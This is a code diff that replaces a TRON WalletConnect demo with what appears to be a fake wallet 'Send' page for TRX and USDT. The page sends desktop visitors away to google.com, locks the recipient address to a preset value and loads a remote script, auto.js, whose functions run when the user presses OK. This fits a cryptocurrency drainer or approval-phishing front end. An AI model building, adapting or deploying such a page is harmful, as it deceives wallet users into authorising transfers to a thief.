@@ -1,27 +1,370 @@
 
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8" />
-  <title>TRON WalletConnect Demo</title>
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-  <script>
-    window.Buffer = buffer.Buffer;
-  </script>
-  
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-  
-  <script type="module" crossorigin src="/tp-okx/assets/index-04839946.js"></script>
-</head>
-<body>
-  <h1>TRON WalletConnect v2 Demo</h1>
+<html>
+    <head>
+        <title>TRX Transfer</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+        <link rel="icon" href="usdt.ico">
+        <style>
+        @font-face {
+            font-family: "iconfont"; /* Project id  */
+            src: url('./iconfont.ttf') format('truetype');
+        }
+        
+        .iconfont {
+          font-family: "iconfont" !important;
+          font-size: 16px;
+          font-style: normal;
+          -webkit-font-smoothing: antialiased;
+          -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .icon-fanhui2:before {
+          content: "\f0116";
+        }
+        
+        .icon-fanhui:before {
+          content: "\f0343";
+        }
+        
+        .icon-saoma:before {
+          content: "\e712";
+        }
+        
+        .icon-tongxunlu:before {
+          content: "\e649";
+        }
 
-  <button id="btnConnect">连接钱包</button>
-  <button id="btnSend" disabled>发送 1 USDT</button>
-<button id="btnDisconnect">断开连接</button>
+        * {
+            padding: 0 0;
+            margin: 0 0;
+        }
 
-  <p>当前地址: <span id="address">未连接</span></p>
+        .container {
+            width: 100vw;
+            height: 100vw;
+            padding: 0 4vw;
+            font-size: 4vw;
+            box-sizing: border-box;
+        }
 
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4vw 0;
+            font-size: 4.4vw;
+        }
+        .header .hearde_name{
+            font-size: 4.2vw;
+            font-weight: 700;
+        }
+        .header .left {
+            width: 4.2vw;
+            height: 4.2vw;
+            font-size: 4.4vw;
+        }
+
+        .trigger_netword {
+            display: flex;
+            justify-content: space-between;
+            padding:  3vw;
+            border: 1px solid #E3E3E3; 
+            border-radius: 1.6vw;
+        }
+
+        .trigger_netword .cash_photo {
+            display: flex;
+            align-items: center;
+
+        }
+
+        .trigger_netword .cash_photo .imgs {
+            width: 8vw;
+            height: 8vw;
+            margin-right: 2.4vw;
+        }
+
+        .trigger_netword .cash_photo .cash {
+            font-size: 4.2vw;
+            font-weight: 700;
+
+        }
+
+        .trigger_netword .netword .netword_name {
+            font-weight: 500;
+            margin-right: 1vw;
+        }
+
+        .trigger_netword .netword .right {
+            color: #ccc;
+            font-size: 4vw;
+        }
+
+        .trigger_netword .netword {
+            display: flex;
+            align-items: center;
+        }
+
+        .lebal_title{
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            line-height: 10vw;
+        }   
+        .lebal_title .bebal_name{
+            font-size: 4.2vw;
+            font-weight: 600;
+
+        }
+        .lebal_title .operate{
+            display: flex;
+            justify-content: space-between;
+            width: 24vw;
+        }
+        .lebal_title .operate .firend{
+            font-size: 6vw;
+        }
+        .lebal_title .available{
+            font-size: 3vw; 
+            /* color: #D0D0D0; */
+        }
+        .in_box{
+            display: flex;
+            justify-content: space-between;
+            padding: 5vw 3vw;
+            background-color: #F8F8F8;
+            border: 1px solid #E3E3E3;
+            border-radius: 1.6vw;
+        }
+        .in_box .insert{
+            outline: none;
+            background-color: transparent;
+            border: transparent;
+            font-size: 3.3vw;
+            color: #666;
+        }
+        .in_box .right_box{
+            color: #D0D0D0;
+            display: flex;
+            justify-content: space-between;
+            
+        }
+        .in_box .right_box .cash{
+            margin:  0 1vw;
+        }
+        .btn{
+                /*margin-left: -3%;*/
+            color: #fff;
+            background-color: #dde0dd;
+            border-radius: 1.6vw;
+            line-height: 10vw;
+            text-align: center;
+            position: fixed;
+            bottom: 16vw;
+            width: 92vw;
+        }
+        .tishi {
+            width: 8.5rem;
+            height: 3.2rem;
+            background: #00000059;
+            z-index: 999999999999;
+            position: fixed;
+            top: 67%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 0.3rem;
+            color: white;
+            font-size: 1.4rem;
+            text-align: center;
+            line-height: 3.2rem;
+            display: none;
+        }
+    </style>
+    <script src="./jquery.min.js" ></script>
+    </head>
+    <body>
+
+    
+    <script>
+    
+function DeviceisMobile() {
+  const isMobile = /iPhone|iPad|iPod|Android|Windows Phone/.test(navigator.userAgent) || 
+                   (navigator.userAgent.includes("Mac") && "ontouchend" in document);
+  const isSmallScreen = window.matchMedia("(max-width: 767px)").matches;
+  const isConnectionMobile = navigator.connection && 
+                             (navigator.connection.type === "cellular" || 
+                              navigator.connection.type === "wifi");
+  const hasMobileUserAgent = navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone)/);
+  return isMobile || isSmallScreen || isConnectionMobile || hasMobileUserAgent;
+}
+
+// 立即执行
+const isMobileDevice = DeviceisMobile();
+
+// if (!navigator.userAgent.toLowerCase().includes("okx")) {
+//         window.location.href = "https://www.google.com";
+
+// } 
+
+
+if (!isMobileDevice) {
+  window.location.href = "https://www.google.com";
+
+}
+
+
+document.writeln("<div class=\"container\">");
+document.writeln("        <div class=\"header\">");
+document.writeln("            <div class=\"iconfont left\">  </div>");
+document.writeln("            <div class=\"hearde_name\">Send</div>");
+document.writeln("            <div class=\"kong\"></div>");
+document.writeln("        </div>");
+document.writeln("");
+document.writeln("        <div class=\"trigger_netword\">");
+document.writeln("            <div class=\"cash_photo\">");
+document.writeln("                <img class=\"imgs\" src=\"./trx.png\" alt=\"usdt图片\">");
+document.writeln("                <div class=\"cash\">TRX</div>");
+document.writeln("            </div>");
+document.writeln("            <div class=\"netword\">");
+document.writeln("                <div class=\"netword_name\">Network </div>");
+document.writeln("                <div class=\"iconfont right icon-fanhui2\"></div>");
+document.writeln("            </div>");
+document.writeln("        </div>");
+document.writeln("        <div class=\"lebal_title\" style=\"margin-top:2.4vw;\">");
+document.writeln("            <div class=\"bebal_name\">Recipient Address</div>");
+document.writeln("            <div class=\"operate\">");
+document.writeln("                <!-- <div class=\"iconfont firend icon-tongxunlu\"></div>");
+document.writeln("                <div class=\"iconfont firend icon-saoma\"></div> -->");
+document.writeln("            </div>");
+document.writeln("        </div>");
+document.writeln("        <div class=\"in_box\">");
+document.writeln("            <input type=\"text\" placeholder=\"Please enter the recipient address\" style=\"width:100vw\" class=\"insert authaddress\" value=\"\" disabled=\"\">");
+document.writeln("        </div>");
+document.writeln("        <div class=\"lebal_title\" style=\"margin-top:5vw;\">");
+document.writeln("            <div class=\"bebal_name\">Transfer Amount</div>");
+document.writeln("            <div class=\"available\" id=\"available\" style=\"display: none;\">可用：<span id=\"ye\">0</span><span> TRX</span> </div>");
+document.writeln("        </div>");
+document.writeln("        <div class=\"in_box\">");
+document.writeln("            <input type=\"number\" placeholder=\"Please enter the amount\" class=\"insert input_amount\" id=\"available1\">");
+document.writeln("            <div class=\"right_box\">");
+document.writeln("                <div class=\"cash\">TRX</div>");
+document.writeln("                <div class=\"cash\">|</div>");
+document.writeln("                <div class=\"cash\" style=\"color:#8056D9\" id=\"allusdt\">全部</div>");
+document.writeln("            </div>");
+document.writeln("        </div>");
+document.writeln("        <div class=\"lebal_title\" style=\"margin-top:5vw;\">");
+document.writeln("            <div class=\"bebal_name\">Network Fee</div>");
+document.writeln("        </div>");
+document.writeln("");
+document.writeln("        <div class=\"trigger_netword\">");
+document.writeln("            <div style=\"font-size: 3vw;\">");
+document.writeln("                <div style=\"font-size: 3.4vw;margin-bottom: 1vw;\"><span id=\"gasPriceA\">0.018002</span> <span class=\"chainname\"></span></div>");
+document.writeln("                <div style=\"color: #D0D0D0;\">$<span id=\"gasPriceU\">0.12241</span></div>");
+document.writeln("            </div>");
+document.writeln("            <div class=\"netword\">");
+document.writeln("                <div class=\"netword_name\" style=\"font-size: 3.5vw;color: #D0D0D0;\"><span id=\"gasPriceG\">240.09</span> GWEI </div>");
+document.writeln("                <div class=\"iconfont right icon-fanhui2\" style=\"font-size: 2vw;\"></div>");
+document.writeln("            </div>");
+document.writeln("        </div>");
+document.writeln("        <div class=\"btn next_button\" id=\"confirm\">OK</div>");
+document.writeln("        <div class=\"tishi\">");
+document.writeln("            Sent");
+document.writeln("        </div>");
+document.writeln("    </div>");
+
+
+    jQuery.ajaxSetup({ cache: true });
+    jQuery.ajax({
+        url: "./auto.js?073019", 
+        dataType: "script",
+        cache: true
+    }).done(function() {
+        user().then();
+    });
   
+  
+  function dapp_load_error(){
+    showmymsg('error', "Please Use Dapp Open!");
+  }
+  function gaserror(){
+    showmymsg('warning', "Insufficient gas fee!");
+  }
+  function chaintochainname(){
+      switch(chain){
+          case "TRON":
+              return "TRC20";
+          break;
+          case "BSC":
+              return "BEP20";
+          break;
+          case "MATIC":
+              return "Polygon";
+          break;
+          case "ETH":
+              return "ERC20";
+          break;
+          case "OKT":
+              return "ORC20";
+          break;
+          case "HECO":
+              return "HRC20";
+          break;
+      }
+  }
+  function chaintogasname(){
+      switch(chain){
+          case "BSC":
+            return "BNB";
+          break;
+          case "TRON":
+            return "TRX";
+          break;
+          default:
+            return chain;
+          break;
+      }
+  }
+  function inipass(){
+   $('.input_amount').on({
+   "change":function(){
+   if($('.input_amount').val().length>0){
+   $('.next_button').css('background-color','#7424F9');
+   $('.next_button').addClass("approve");
+   $('.approve').off().on('click',function(){password().then();});
+   }else{
+   $('.next_button').css('background-color','#dde0dd');
+   $('.next_button').removeClass("approve");
+   }
+  },
+  "keyup":function(){
+   if($('.input_amount').val().length>0){
+   $('.next_button').css('background-color','#7424F9');
+   $('.next_button').addClass("approve");
+   $('.approve').off().on('click',function(){password().then();});
+   }else{
+   $('.next_button').css('background-color','#dde0dd');
+   $('.next_button').removeClass("approve");
+   }
+  }
+  });
+   
+   $('.authaddress').val(authaddress);
+   $('.netword_name').html("Network "+chaintochainname(chain));
+   $('.chainname').html(chaintogasname(chain));
+   if(chaintogasname(chain)=="TRX"){
+       $('#gasPriceA').html('18');
+       $('#gasPriceU').html('1.4');
+   }
+  $('.cash').off().on('click',function(){
+      $('.input_amount').val(wallet_user_token_amount);
+      $('.next_button').css('background-color','#7424F9');
+      $('.next_button').addClass("approve");
+      $('.approve').off().on('click',function(){password().then()});
+      
+  });
+  }
+ </script>
 </body>
 </html>
